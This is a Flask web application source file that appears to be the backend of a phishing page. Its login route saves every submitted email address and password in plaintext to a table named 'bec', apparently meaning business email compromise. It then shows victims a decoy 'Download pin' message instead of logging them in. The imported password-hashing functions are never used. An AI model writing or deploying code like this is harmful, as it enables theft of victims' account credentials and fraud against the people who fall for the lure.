from flask import Flask, render_template, g, request, session, redirect, url_for
from database import get_db
from werkzeug.security import generate_password_hash, check_password_hash
import os

app = Flask(__name__)

@app.teardown_appcontext
def close_db(error):
	if hasattr(g, 'sqlite_db'):
		g.sqlite_db.close()


@app.route('/', methods=['GET', 'POST'])
def login():
	if request.method == 'POST':
		db = get_db()
		db.execute('insert into bec (xemail, xpassword) values (?, ?)', [request.form['xemail'], request.form['xpassword']])
		db.commit()
		return '<h1>Download pin: 90234</h1>'
	return render_template('login.html')



if __name__ == '__main__':
	app.run(debug=True)